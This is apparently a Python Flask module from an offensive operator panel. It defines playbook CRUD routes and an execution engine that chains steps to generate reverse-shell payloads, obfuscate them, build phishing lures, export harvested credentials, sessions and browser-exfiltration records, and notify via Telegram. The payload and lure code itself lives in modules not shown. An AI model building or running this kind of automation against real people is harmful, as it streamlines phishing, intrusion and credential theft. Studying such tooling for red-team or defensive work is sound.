"""playbooks blueprint (P3.23) — playbook automation CRUD + execution.

Moved verbatim from app.py.  Response shapes are frozen and enforced by
tests/char.
"""
from __future__ import annotations

import json
from datetime import datetime

from flask import Blueprint, jsonify, request, session

import database as db

from app.exec import playbook as playbook_engine

bp = Blueprint("playbooks", __name__)


@bp.route('/api/playbooks', methods=['GET'])
def api_list_playbooks():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    playbooks = db.get_playbooks()
    for pb in playbooks:
        for field in ('steps', 'variables', 'execution_log'):
            if isinstance(pb.get(field), str):
                try:
                    pb[field] = json.loads(pb[field])
                except Exception:
                    pass
    return jsonify({'playbooks': playbooks})
@bp.route('/api/playbooks', methods=['POST'])
def api_create_playbook():
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    data = request.json
    pb_id = db.save_playbook(
        name=data.get('name', 'Untitled Playbook'),
        description=data.get('description', ''),
        steps=data.get('steps', []),
        variables=data.get('variables', {}),
    )
    db.log_operator_action(session.get('IAm-logined', 'unknown'), 'create_playbook',
                           f'Created playbook: {data.get("name")}', request.remote_addr)
    return jsonify({'id': pb_id, 'status': 'created'})
@bp.route('/api/playbooks/<int:pb_id>', methods=['GET'])
def api_get_playbook(pb_id):
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    pb = db.get_playbook(pb_id)
    if not pb:
        return jsonify({'error': 'Playbook not found'}), 404
    for field in ('steps', 'variables', 'execution_log'):
        if isinstance(pb.get(field), str):
            try:
                pb[field] = json.loads(pb[field])
            except Exception:
                pass
    return jsonify(pb)
@bp.route('/api/playbooks/<int:pb_id>', methods=['PUT'])
def api_update_playbook(pb_id):
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    data = request.json
    db.update_playbook(pb_id, **data)
    return jsonify({'status': 'updated'})
@bp.route('/api/playbooks/<int:pb_id>', methods=['DELETE'])
def api_delete_playbook(pb_id):
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    db.delete_playbook(pb_id)
    return jsonify({'status': 'deleted'})
@bp.route('/api/playbooks/<int:pb_id>/run', methods=['POST'])
def api_run_playbook(pb_id):
    """P14.10: execute the engine steps (exec/verify/strike/checkpoint) with
    an honest per-step result -- nothing is claimed without a check."""
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    pb = db.get_playbook(pb_id)
    if not pb:
        return jsonify({'error': 'Playbook not found'}), 404
    steps = json.loads(pb['steps']) if isinstance(pb['steps'], str) else pb['steps']
    variables = json.loads(pb['variables']) if isinstance(pb['variables'], str) else pb['variables']
    data = request.json or {}
    run = playbook_engine.run_playbook(steps, variables,
                                       on_fail=data.get('on_fail', 'stop'),
                                       target_id=data.get('target_id'))
    db.update_playbook(pb_id,
                       status='completed' if run['ok'] else 'failed',
                       execution_log=run['results'],
                       last_run=datetime.now().isoformat(),
                       run_count=(pb.get('run_count', 0) or 0) + 1)
    db.log_operator_action(session.get('IAm-logined', 'unknown'), 'run_playbook',
                           f'Ran playbook #{pb_id}: {pb.get("name")}', request.remote_addr)
    return jsonify({'status': 'executed' if run['ok'] else 'failed', **run})


@bp.route('/api/playbooks/<int:pb_id>/execute', methods=['POST'])
def api_execute_playbook(pb_id):
    """Execute a playbook's steps sequentially"""
    if 'IAm-logined' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    pb = db.get_playbook(pb_id)
    if not pb:
        return jsonify({'error': 'Playbook not found'}), 404
    steps = json.loads(pb['steps']) if isinstance(pb['steps'], str) else pb['steps']
    variables = json.loads(pb['variables']) if isinstance(pb['variables'], str) else pb['variables']
    execution_log = []
    pb_ctx = playbook_engine.new_context(variables)
    for i, step in enumerate(steps):
        step_result = {'step': i + 1, 'action': step.get('action', ''), 'status': 'pending', 'timestamp': datetime.now().isoformat()}
        try:
            action = step.get('action', '')
            params = step.get('params', {})
            # Substitute variables in params
            for k, v in params.items():
                if isinstance(v, str):
                    for var_name, var_val in variables.items():
                        params[k] = params[k].replace(f'{{{{{var_name}}}}}', str(var_val))

            # P14.10: execute + verify + checkpoint/rollback actions.
            if playbook_engine.handles(action):
                step['_index'] = i
                outcome = playbook_engine.run_step(step, pb_ctx)
                step_result['status'] = outcome['status']
                step_result['output'] = outcome['output']
                step_result['verified'] = outcome.get('verified')
                if outcome.get('checkpoint'):
                    step_result['checkpoint'] = outcome['checkpoint']
                if outcome['status'] == 'error':
                    behave = step.get('on_fail', 'stop')
                    if behave == 'rollback':
                        step_result['rollback'] = playbook_engine.rollback(pb_ctx)
                    execution_log.append(step_result)
                    if behave != 'continue':
                        break
                    continue
                execution_log.append(step_result)
                continue

            if action == 'generate_payload':
                from payload_generator import generate_payload
                result = generate_payload(params.get('type', 'ps_reverse'), params)
                step_result['output'] = result[:500] if result else 'No output'
                step_result['status'] = 'success'
            elif action == 'obfuscate':
                from obfuscation_engine import obfuscate_payload
                result = obfuscate_payload(
                    params.get('payload', ''),
                    params.get('language', 'powershell'),
                    params.get('profile', 'medium'),
                )
                step_result['output'] = str(result.get('obfuscated', ''))[:500]
                step_result['status'] = 'success'
            elif action == 'generate_lure':
                from lure_generator import generate_lure as lg_generate
                tpl_idx = params.get('template_index', 0)
                try:
                    tpl_idx = int(tpl_idx)
                except (ValueError, TypeError):
                    tpl_idx = 0
                result = lg_generate(
                    params.get('category', 'it_support'),
                    tpl_idx,
                    params.get('variables', {}),
                    params.get('type', 'email'),
                )
                step_result['output'] = result.get('body', '')[:500]
                step_result['status'] = 'success'
            elif action == 'generate_report':
                from report_generator import generate_report as rg_generate
                config = {
                    'title': params.get('title', 'Playbook Auto-Report'),
                    'organization': params.get('organization', 'Security Team'),
                    'target': params.get('target', 'Target'),
                    'author': session.get('IAm-logined', 'Operator'),
                    'date': datetime.now().strftime('%Y-%m-%d'),
                    'classification': params.get('classification', 'CONFIDENTIAL'),
                }
                result = rg_generate(config)
                report_id = db.save_report(
                    name=config['title'], report_type='full',
                    config=config, html_content=result['html'], stats=result['stats'],
                )
                step_result['output'] = f'Report #{report_id} generated — {result["stats"].get("findings", 0)} findings'
                step_result['status'] = 'success'
            elif action == 'send_telegram':
                try:
                    from telegram_bot import send_message
                    msg = params.get('message', 'Playbook notification')
                    send_message(msg)
                    step_result['output'] = f'Telegram: {msg[:200]}'
                    step_result['status'] = 'success'
                except ImportError:
                    step_result['output'] = 'Telegram bot module not configured'
                    step_result['status'] = 'skipped'
            elif action == 'export_data':
                data_type = params.get('data_type', 'credentials')
                fmt = params.get('format', 'json')
                export_data = []
                if data_type == 'credentials':
                    export_data = db.get_credentials() if hasattr(db, 'get_credentials') else []
                elif data_type == 'sessions':
                    export_data = db.get_sessions() if hasattr(db, 'get_sessions') else []
                elif data_type == 'browser_exfil':
                    export_data = db.get_browser_exfil() if hasattr(db, 'get_browser_exfil') else []
                step_result['output'] = f'Exported {len(export_data)} {data_type} records ({fmt})'
                step_result['status'] = 'success'
            elif action == 'http_request':
                import urllib.request
                import urllib.error
                url = params.get('url', '')
                method = params.get('method', 'GET').upper()
                if url:
                    req = urllib.request.Request(url, method=method)
                    try:
                        headers_str = params.get('headers', '')
                        if headers_str:
                            hdrs = json.loads(headers_str) if headers_str.strip().startswith('{') else {}
                            for hk, hv in hdrs.items():
                                req.add_header(hk, hv)
                    except Exception:
                        pass
                    resp_http = urllib.request.urlopen(req, timeout=10)
                    step_result['output'] = f'HTTP {method} {url} → {resp_http.status} ({resp_http.read(200).decode("utf-8", errors="replace")})'
                    step_result['status'] = 'success'
                else:
                    step_result['output'] = 'No URL provided'
                    step_result['status'] = 'error'
            elif action == 'conditional':
                condition = params.get('condition', 'not_empty')
                var_name = params.get('variable', '')
                expected = params.get('value', '')
                actual = variables.get(var_name, '')
                passed = False
                if condition == 'has_data':
                    passed = bool(actual)
                elif condition == 'equals':
                    passed = str(actual) == str(expected)
                elif condition == 'not_empty':
                    passed = len(str(actual).strip()) > 0
                elif condition == 'contains':
                    passed = str(expected) in str(actual)
                if passed:
                    step_result['output'] = f'Condition passed: {var_name} {condition} {expected}'
                    step_result['status'] = 'success'
                else:
                    step_result['output'] = f'Condition failed: {var_name} {condition} {expected} — stopping'
                    step_result['status'] = 'error'
                    execution_log.append(step_result)
                    break  # Stop execution on failed condition
            elif action == 'delay':
                import time as time_mod
                delay_secs = int(params.get('seconds', 1))
                time_mod.sleep(min(delay_secs, 10))  # Cap at 10s
                step_result['output'] = f'Delayed {delay_secs}s'
                step_result['status'] = 'success'
            elif action == 'log':
                msg = params.get('message', '')
                step_result['output'] = msg
                step_result['status'] = 'success'
            else:
                step_result['output'] = f'Unknown action: {action}'
                step_result['status'] = 'skipped'
        except Exception as e:
            step_result['status'] = 'error'
            step_result['output'] = str(e)
        execution_log.append(step_result)

    # Update playbook with execution results
    db.update_playbook(pb_id,
                       status='completed',
                       execution_log=execution_log,
                       last_run=datetime.now().isoformat(),
                       run_count=(pb.get('run_count', 0) or 0) + 1)
    db.log_operator_action(session.get('IAm-logined', 'unknown'), 'execute_playbook',
                           f'Executed playbook #{pb_id}: {pb.get("name")}', request.remote_addr)
    return jsonify({'status': 'executed', 'execution_log': execution_log})
